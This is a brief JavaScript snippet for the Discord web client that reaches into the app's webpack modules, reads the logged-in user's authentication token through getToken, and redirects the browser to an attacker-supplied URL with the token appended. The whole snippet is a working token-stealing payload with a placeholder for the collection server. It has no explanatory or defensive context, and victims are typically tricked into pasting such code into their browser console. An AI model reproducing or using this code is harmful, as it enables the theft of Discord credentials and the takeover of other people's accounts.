const url = 'PASTE_URL_HERE';
var f = (webpackChunkdiscord_app.push([[''], {}, e=> {
  m = [];
  for (let c in e.c) m.push(e.c[c]);
}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
window.location.replace(url + '/' + f);
